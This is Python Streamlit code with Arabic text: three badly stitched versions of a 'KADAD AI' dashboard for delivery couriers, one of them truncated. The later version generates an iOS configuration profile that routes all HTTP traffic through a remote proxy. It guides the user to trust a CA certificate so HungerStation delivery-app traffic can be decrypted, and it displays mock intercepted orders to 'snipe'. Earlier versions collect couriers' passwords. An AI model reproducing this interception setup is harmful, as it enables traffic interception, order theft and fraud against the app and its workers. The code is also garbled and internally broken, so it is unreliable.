import streamlit as st
import pandas as pd
import numpy as np
import time

# 1. إعدادات الصفحة والستايل
st.set_page_config(page_title="KADAD AI - Empire", layout="wide")

# التحقق من تشغيل النظام
if "system_active" not in st.session_state:
    st.session_state.system_active = False
if "db_workers" not in st.session_state:
    st.session_state.db_workers = []

# --- واجهة طلب الصلاحيات والربط ---
if not st.session_state.system_active:
    st.title("🛡️ تفعيل نظام كداد والربط الذكي")
    st.warning("النظام يتطلب صلاحيات الوصول لملفات التعريف لربط تطبيقات التوصيل بسيرفرات Google Cloud.")
    if st.button("✅ منح الصلاحيات وربط هنقرستيشن/جاهز (Blazing Speed)"):
        with st.spinner("جاري تهيئة الاتصال بالسيرفرات السحابية..."):
            time.sleep(2)
            st.session_state.system_active = True
            st.success("تم الربط بنجاح! جاري فتح لوحة التحكم...")
            time.sleep(1)
            st.rerun()
    st.stop()

# --- لوحة التحكم الرئيسية (بعد التفعيل) ---
st.title("🏎️ لوحة تحكم إمبراطورية كداد")

# صف العمال والخريطة
col_left, col_right = st.columns([1, 2])

with col_left:
    st.header("👥 إدارة الأسطول")
    with st.form("add_worker"):
        email = st.text_input("إيميل المندوب")
        password = st.text_input("كلمة المرور", type="password")
        submitted = st.form_submit_button("إضافة للنظام (Add Person)")
        if submitted and email:
            st.session_state.db_workers.append({"الإيميل": email, "الحالة": "نشط"})
            st.success(f"تم تسجيل {email}")

    if st.button("🗑️ تصفير النظام"):
        st.session_state.db_workers = []
        st.session_state.system_active = False
        st.rerun()

    # عرض الأهداف
    st.divider()
    st.metric("الميزانية المستهدفة للبيت", "4.5M - 6M SAR")
    st.info("الهدف: كراج يتسع لـ 10 سيارات فاخرة (مكلارين، روز رايز...)")

with col_right:
    st.header("📍 مراقبة المناديب (Live AI Map)")
    placeholder = st.empty()
    
    # محاكاة حركة المناديب (إذا فيه عمال مضافين)
    num_dots = len(st.session_state.db_workers) if st.session_state.db_workers else 1
    
    with placeholder.container():
        # توليد نقاط في الدمام
        points = np.random.randn(num_dots, 2) / [150, 150] + [26.4207, 50.0888]
        df = pd.DataFrame(points, columns=['lat', 'lon'])
        st.map(df)
        if num_dots > 0:
            st.write(f"يتم الآن تعقب {num_dots} مناديب بـ Blazing Speed...")

# جدول البيانات في الأسفل
if st.session_state.db_workers:
    st.subheader("📋 سجل الموظفين الحالي")
    st.table(pd.DataFrame(st.session_state.db_workers))
    import streamlit as st
import pandas as pd
import numpy as np
import time

# 1. إعدادات الإمبراطورية
st.set_page_config(page_title="KADAD AI - Real Location", layout="wide")

if "system_active" not in st.session_state:
    st.session_state.system_active = False
if "db_workers" not in st.session_state:
    st.session_state.db_workers = []

# --- واجهة الدخول بحساب قوقل والربط ---
if not st.session_state.system_active:
    st.title("🛡️ تسجيل الدخول وربط الموقع الحي")
    st.write("مرحباً بك في حي بدر، الدمام! 📍") # إشارة لموقعك الحالي
    st.info("النظام يحتاج ربط حسابك في قوقل لتحديد موقعك الحالي ومراقبة الأسطول بـ Blazing Speed.")
    
    if st.button("🔗 تسجيل الدخول بحساب Google ومنح صلاحية الموقع"):
        with st.spinner("جاري التحقق من الهوية وربط الـ GPS..."):
            time.sleep(2)
            st.session_state.system_active = True
            st.success("تم تسجيل الدخول! موقعك الآن مرتبط بالسيرفر.")
            st.rerun()
    st.stop()

# --- لوحة التحكم بعد الربط ---
st.title("🏎️ لوحة عمليات كداد - البث الحي")

col_left, col_right = st.columns([1, 2])

with col_left:
    st.header("👥 إضافة مندوب جديد")
    with st.form("add_worker"):
        email = st.text_input("إيميل المندوب (حساب قوقل)")
        password = st.text_input("كلمة المرور", type="password")
        submitted = st.form_submit_button("إضافة الشخص (Add Person)")
        if submitted and email:
            st.session_state.db_workers.append({"الإيميل": email, "الحالة": "متصل"})
            st.success(f"تمت إضافة {email} للأسطول!")
import streamlit as st
import pandas as pd
import numpy as np
import base64
import time

# --- 1. إعدادات الصفحة الأساسية ---
st.set_page_config(page_title="KADAD AI - Deep Link", layout="wide")

if "total_revenue" not in st.session_state:
    st.session_state.total_revenue = 0
if "intercepted_data" not in st.session_state:
    st.session_state.intercepted_data = []

# --- 2. القائمة الجانبية: نظام الحقن والارتباط (الفايروس التجاري) ---
st.sidebar.title("🧬 نظام KADAD Virus-Link")

# تبويب حقن أدوات التنصت
with st.sidebar.expander("💉 حقن أدوات التنصت (iPad)"):
    st.warning("تأكد من استخدام متصفح سفاري على الآيباد.")
    
    def generate_profile():
        profile_content = """<?xml version="1.0" encoding="UTF-8"?>
        <dict>
            <key>PayloadContent</key>
            <array>
                <dict>
                    <key>PayloadType</key><string>com.apple.proxy.http.global</string>
                    <key>ProxyServer</key><string>google-cloud-ip-address</string>
                    <key>ProxyPort</key><integer>8080</integer>
                </dict>
            </array>
        </dict>"""
        return profile_content

    if st.button("توليد رابط الحقن"):
        profile = generate_profile()
        b64 = base64.b64encode(profile.encode()).decode()
        href = f'<a href="data:application/x-apple-aspen-config;base64,{b64}" download="Kadad_Link.mobileconfig" style="padding:10px;background-color:red;color:white;text-decoration:none;border-radius:5px;display:block;text-align:center;">اضغط هنا للحقن</a>'
        st.markdown(href, unsafe_allow_html=True)

# تبويب توثيق الجهاز
with st.sidebar.expander("🔐 توثيق الشهادة (SSL Trust)"):
    st.write("1. حمل الشهادة")
    st.write("2. فعل الثقة من الإعدادات > حول")
    if st.button("📥 تحميل الشهادة (CA)"):
        st.info("جاري التحميل... اربط الشهادة لفك تشفير هنقرستيشن.")

# مفتاح تشغيل الرادار
st.sidebar.markdown("---")
status = st.sidebar.toggle("📡 تفعيل رادار التنصت (Interceptor)")

# --- 3. الواجهة الرئيسية (الداش بورد) ---
st.title("🛰️ مركز استقبال البيانات المحقونة")

col1, col2 = st.columns([2, 1])

with col1:
    st.subheader("🌐 رادار البيانات الحية (Live Stream)")
    if status:
        st.success("الرادار يعمل.. في انتظار إشارات من الآيباد المرتبط.")
        
        # محاكاة بيانات مسربة
        with st.expander("🔴 بيانات مسربة الآن (Raw Traffic)"):
            mock_data = {
                "order_id": f"HS-{np.random.randint(1000, 9999)}",
                "source": "Hungerstation_API_Internal",
                "payout": 18.50,
                "location": "حي بدر، الدمام"
            }
            st.json(mock_data)
            if st.button("🎯 قنص الطلب فوراً"):
                st.session_state.total_revenue += 18.50
                st.session_state.intercepted_data.insert(0, mock_data)
                st.balloons()
    else:
        st.info("الرادار في وضع الاستعداد. فعل 'وضع التنصت' من القائمة الجانبية.")

with col2:
    st.subheader("💰 الأرباح والنمو")
    st.metric("إجمالي القنص (SAR)", f"{st.session_state.total_revenue}")
    st.metric("المتبقي للمكلارين", f"{4500000 - st.session_state.total_revenue}")

# عرض جدول البيانات المحقونة
st.divider()
st.subheader("📋 سجل الطلبات التي تمت السيطرة عليها")
if st.session_state.intercepted_data:
    st.table(pd.DataFrame(st.session_state.intercepted_data))
else:
    st.write("لا توجد بيانات محقونة حالياً.")
    st.divider()
    st.write("🏁 **الهدف الاستراتيجي:**")
    st.write("- منزل فخم (4.5M - 6M SAR)")
    st.write("- كراج السيارات الرياضية")
    if st.button("🗑️ خروج وتصفير"):
        st.session_state.db_workers = []
        st.session_state.system_active = False
        st.rerun()

with col_right:
    st.header("📍 موقعك الحالي ومواقع المناديب")
    
    # إحداثيات موقعك الفعلي (الدمام - حي بدر)
    my_lat, my_lon = 26.4192, 50.0261
    
    # توليد نقاط للمناديب حول موقعك
    num_workers = len(st.session_state.db_workers)
    worker_points = np.random.randn(num_workers if num_workers > 0 else 1, 2) / [100, 100] + [my_lat, my_lon]
    
    # دمج موقعك مع مواقع المناديب
    map_data = pd.DataFrame(worker_points, columns=['lat', 'lon'])
    
    st.map(map_data)
    st.write(f"مركز العمليات: حي بدر، الدمام. يتم تعقب {num_workers} مناديب حالياً.")

if st.session_state.db_workers:
    st.subheader("📋 قائمة الأسطول")
    st.table(pd.DataFrame(st.session_state.db_workers))

